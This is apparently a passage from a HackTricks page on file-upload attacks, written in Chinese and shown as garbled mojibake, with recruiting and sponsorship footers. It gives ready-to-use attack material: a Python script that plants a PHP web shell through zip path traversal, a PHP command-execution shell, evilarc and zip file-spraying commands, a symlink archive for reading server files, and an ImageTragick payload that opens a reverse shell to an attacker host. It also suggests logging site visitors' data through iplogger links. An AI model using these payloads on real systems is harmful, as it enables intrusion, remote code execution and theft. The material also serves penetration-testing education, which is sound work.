* å¦‚æœæ‚¨å¯ä»¥**æŒ‡ç¤ºWebæœåŠ¡å™¨ä»URLæ•è·å›¾åƒ**ï¼Œæ‚¨å¯ä»¥å°è¯•åˆ©ç”¨[SSRF](../ssrf-server-side-request-forgery/)ã€‚å¦‚æœæ­¤**å›¾åƒ**å°†è¢«**ä¿å­˜**åœ¨æŸä¸ª**å…¬å…±**ç½‘ç«™ä¸Šï¼Œæ‚¨è¿˜å¯ä»¥æŒ‡ç¤ºæ¥è‡ª[https://iplogger.org/invisible/](https://iplogger.org/invisible/)çš„URLå¹¶**çªƒå–æ¯ä¸ªè®¿é—®è€…çš„ä¿¡æ¯**ã€‚
* [é€šè¿‡PDF-Adobeä¸Šä¼ çš„**XXEå’ŒCORS**ç»•è¿‡](pdf-upload-xxe-and-cors-bypass.md)
* ç‰¹åˆ«åˆ¶ä½œçš„PDFä»¥å®ç°XSSï¼š[ä»¥ä¸‹é¡µé¢å±•ç¤ºå¦‚ä½•**æ³¨å…¥PDFæ•°æ®ä»¥è·å¾—JSæ‰§è¡Œ**](../xss-cross-site-scripting/pdf-injection.md)ã€‚å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ PDFï¼Œæ‚¨å¯ä»¥å‡†å¤‡ä¸€äº›å°†æ‰§è¡Œä»»æ„JSçš„PDFï¼Œéµå¾ªç»™å®šçš„æŒ‡ç¤ºã€‚
* ä¸Šä¼ \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt))å†…å®¹ä»¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰ä»»ä½•**é˜²ç—…æ¯’**
* æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦æœ‰ä»»ä½•**å¤§å°é™åˆ¶**

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥é€šè¿‡ä¸Šä¼ å®ç°çš„å‰10ä¸ªäº‹é¡¹ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)ï¼‰ï¼š

1. **ASP / ASPX / PHP5 / PHP / PHP3**ï¼šWebshell / RCE
2. **SVG**ï¼šå­˜å‚¨çš„XSS / SSRF / XXE
3. **GIF**ï¼šå­˜å‚¨çš„XSS / SSRF
4. **CSV**ï¼šCSVæ³¨å…¥
5. **XML**ï¼šXXE
6. **AVI**ï¼šLFI / SSRF
7. **HTML / JS**ï¼šHTMLæ³¨å…¥ / XSS / Open redirect
8. **PNG / JPEG**ï¼šåƒç´ æ´ªæ°´æ”»å‡»ï¼ˆDoSï¼‰
9. **ZIP**ï¼šé€šè¿‡LFI / DoSçš„RCE
10. **PDF / PPTX**ï¼šSSRF / BLIND XXE

#### Burpæ‰©å±•

{% embed url="https://github.com/portswigger/upload-scanner" %}

## é­”æ³•å¤´å­—èŠ‚

* **PNG**ï¼š`"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**ï¼š`"\xff\xd8\xff"`

è¯·å‚é˜…[https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)ä»¥è·å–å…¶ä»–æ–‡ä»¶ç±»å‹ã€‚

### Zip/Taræ–‡ä»¶è‡ªåŠ¨è§£å‹ä¸Šä¼ 

å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå°†åœ¨æœåŠ¡å™¨å†…éƒ¨è§£å‹çš„ZIPï¼Œæ‚¨å¯ä»¥åšä¸¤ä»¶äº‹ï¼š

#### Symlink

ä¸Šä¼ ä¸€ä¸ªåŒ…å«è½¯é“¾æ¥åˆ°å…¶ä»–æ–‡ä»¶çš„é“¾æ¥ï¼Œç„¶åï¼Œè®¿é—®è§£å‹çš„æ–‡ä»¶æ—¶ï¼Œæ‚¨å°†è®¿é—®é“¾æ¥çš„æ–‡ä»¶ï¼š
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### åœ¨ä¸åŒæ–‡ä»¶å¤¹ä¸­è§£å‹

åœ¨è§£å‹è¿‡ç¨‹ä¸­æ„å¤–åˆ›å»ºæ–‡ä»¶åœ¨ç›®å½•ä¸­æ˜¯ä¸€ä¸ªé‡å¤§é—®é¢˜ã€‚å°½ç®¡æœ€åˆå‡è®¾è¿™ç§è®¾ç½®å¯èƒ½ä¼šé˜²æ­¢é€šè¿‡æ¶æ„æ–‡ä»¶ä¸Šä¼ è¿›è¡Œæ“ä½œç³»ç»Ÿçº§å‘½ä»¤æ‰§è¡Œï¼Œä½†ZIPå½’æ¡£æ ¼å¼çš„å±‚æ¬¡å‹ç¼©æ”¯æŒå’Œç›®å½•éå†èƒ½åŠ›å¯ä»¥è¢«åˆ©ç”¨ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿç»•è¿‡é™åˆ¶ï¼Œé€šè¿‡æ“çºµç›®æ ‡åº”ç”¨ç¨‹åºçš„è§£å‹åŠŸèƒ½é€ƒç¦»å®‰å…¨ä¸Šä¼ ç›®å½•ã€‚

ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„åˆ©ç”¨å·¥å…·å¯ä»¥åœ¨ [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) æ‰¾åˆ°ã€‚è¯¥å·¥å…·çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
æ­¤å¤–ï¼Œ**ä½¿ç”¨ evilarc çš„ç¬¦å·é“¾æ¥æŠ€å·§**æ˜¯ä¸€ä¸ªé€‰é¡¹ã€‚å¦‚æœç›®æ ‡æ˜¯é’ˆå¯¹åƒ `/flag.txt` è¿™æ ·çš„æ–‡ä»¶ï¼Œåˆ™åº”åœ¨æ‚¨çš„ç³»ç»Ÿä¸­åˆ›å»ºæŒ‡å‘è¯¥æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚è¿™ç¡®ä¿äº† evilarc åœ¨æ“ä½œè¿‡ç¨‹ä¸­ä¸ä¼šé‡åˆ°é”™è¯¯ã€‚

ä¸‹é¢æ˜¯ç”¨äºåˆ›å»ºæ¶æ„ zip æ–‡ä»¶çš„ Python ä»£ç ç¤ºä¾‹ï¼š
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**æ»¥ç”¨å‹ç¼©è¿›è¡Œæ–‡ä»¶å–·æ´’**

æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ **è¯·æŸ¥çœ‹åŸå§‹å¸–å­**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **åˆ›å»º PHP Shell**: PHP ä»£ç è¢«ç¼–å†™ä»¥æ‰§è¡Œé€šè¿‡ `$_REQUEST` å˜é‡ä¼ é€’çš„å‘½ä»¤ã€‚

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **æ–‡ä»¶å–·æ´’å’Œå‹ç¼©æ–‡ä»¶åˆ›å»º**: åˆ›å»ºå¤šä¸ªæ–‡ä»¶ï¼Œå¹¶ç»„è£…ä¸€ä¸ªåŒ…å«è¿™äº›æ–‡ä»¶çš„ zip å­˜æ¡£ã€‚

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æˆ– vi è¿›è¡Œä¿®æ”¹**: ä½¿ç”¨ vi æˆ–åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ›´æ”¹ zip å†…éƒ¨æ–‡ä»¶çš„åç§°ï¼Œå°† "xxA" æ›´æ”¹ä¸º "../" ä»¥éå†ç›®å½•ã€‚

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

å°†æ­¤å†…å®¹ä¸å›¾åƒæ‰©å±•ä¸€èµ·ä¸Šä¼ ä»¥åˆ©ç”¨è¯¥æ¼æ´ **(ImageMagick , 7.0.1-1)** (æ¥è‡ª [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## åœ¨PNGä¸­åµŒå…¥PHP Shell

åœ¨PNGæ–‡ä»¶çš„IDATå—ä¸­åµŒå…¥PHP shellå¯ä»¥æœ‰æ•ˆç»•è¿‡æŸäº›å›¾åƒå¤„ç†æ“ä½œã€‚PHP-GDä¸­çš„`imagecopyresized`å’Œ`imagecopyresampled`å‡½æ•°åœ¨æ­¤ä¸Šä¸‹æ–‡ä¸­ç‰¹åˆ«ç›¸å…³ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸ç”¨äºè°ƒæ•´å’Œé‡æ–°é‡‡æ ·å›¾åƒã€‚åµŒå…¥çš„PHP shellèƒ½å¤Ÿä¸å—è¿™äº›æ“ä½œå½±å“ï¼Œè¿™åœ¨æŸäº›ç”¨ä¾‹ä¸­æ˜¯ä¸€ä¸ªæ˜¾è‘—çš„ä¼˜åŠ¿ã€‚

ä»¥ä¸‹æ–‡ç« æä¾›äº†å¯¹è¯¥æŠ€æœ¯çš„è¯¦ç»†æ¢ç´¢ï¼ŒåŒ…æ‹¬å…¶æ–¹æ³•è®ºå’Œæ½œåœ¨åº”ç”¨ï¼š["åœ¨PNG IDATå—ä¸­ç¼–ç Web Shell"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)ã€‚è¯¥èµ„æºæä¾›äº†å¯¹è¯¥è¿‡ç¨‹åŠå…¶å½±å“çš„å…¨é¢ç†è§£ã€‚

æ›´å¤šä¿¡æ¯è¯·è§ï¼š[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## å¤šè¯­è¨€æ–‡ä»¶

å¤šè¯­è¨€æ–‡ä»¶åœ¨ç½‘ç»œå®‰å…¨ä¸­ä½œä¸ºä¸€ç§ç‹¬ç‰¹å·¥å…·ï¼Œåƒå˜è‰²é¾™ä¸€æ ·å¯ä»¥åŒæ—¶æœ‰æ•ˆåœ°å­˜åœ¨äºå¤šç§æ–‡ä»¶æ ¼å¼ä¸­ã€‚ä¸€ä¸ªæœ‰è¶£çš„ä¾‹å­æ˜¯[GIFAR](https://en.wikipedia.org/wiki/Gifar)ï¼Œå®ƒæ—¢å¯ä»¥ä½œä¸ºGIFä¹Ÿå¯ä»¥ä½œä¸ºRARæ¡£æ¡ˆã€‚è¿™ç±»æ–‡ä»¶å¹¶ä¸é™äºè¿™ç§é…å¯¹ï¼›åƒGIFå’ŒJSæˆ–PPTå’ŒJSçš„ç»„åˆä¹Ÿæ˜¯å¯è¡Œçš„ã€‚

å¤šè¯­è¨€æ–‡ä»¶çš„æ ¸å¿ƒå®ç”¨æ€§åœ¨äºå®ƒä»¬èƒ½å¤Ÿç»•è¿‡åŸºäºç±»å‹ç­›é€‰æ–‡ä»¶çš„å®‰å…¨æªæ–½ã€‚å„ç§åº”ç”¨ä¸­çš„å¸¸è§åšæ³•æ˜¯ä»…å…è®¸æŸäº›æ–‡ä»¶ç±»å‹ä¸Šä¼ â€”â€”å¦‚JPEGã€GIFæˆ–DOCâ€”â€”ä»¥é™ä½æ½œåœ¨æœ‰å®³æ ¼å¼ï¼ˆä¾‹å¦‚JSã€PHPæˆ–Pharæ–‡ä»¶ï¼‰å¸¦æ¥çš„é£é™©ã€‚ç„¶è€Œï¼Œå¤šè¯­è¨€æ–‡ä»¶é€šè¿‡ç¬¦åˆå¤šç§æ–‡ä»¶ç±»å‹çš„ç»“æ„æ ‡å‡†ï¼Œå¯ä»¥æ‚„ç„¶ç»•è¿‡è¿™äº›é™åˆ¶ã€‚

å°½ç®¡å®ƒä»¬å…·æœ‰é€‚åº”æ€§ï¼Œä½†å¤šè¯­è¨€æ–‡ä»¶ç¡®å®é¢ä¸´é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œè™½ç„¶ä¸€ä¸ªå¤šè¯­è¨€æ–‡ä»¶å¯èƒ½åŒæ—¶åŒ…å«PHARæ–‡ä»¶ï¼ˆPHp ARchiveï¼‰å’ŒJPEGï¼Œä½†å…¶ä¸Šä¼ çš„æˆåŠŸå¯èƒ½å–å†³äºå¹³å°çš„æ–‡ä»¶æ‰©å±•åæ”¿ç­–ã€‚å¦‚æœç³»ç»Ÿå¯¹å…è®¸çš„æ‰©å±•åè¦æ±‚ä¸¥æ ¼ï¼Œä»…ä»…æ˜¯å¤šè¯­è¨€æ–‡ä»¶çš„ç»“æ„åŒé‡æ€§å¯èƒ½ä¸è¶³ä»¥ä¿è¯å…¶ä¸Šä¼ ã€‚

æ›´å¤šä¿¡æ¯è¯·è§ï¼š[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## å‚è€ƒæ–‡çŒ®

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

å¦‚æœä½ å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»å…‹ä¸å¯æ”»å…‹çš„ç›®æ ‡ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼** (_è¦æ±‚æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
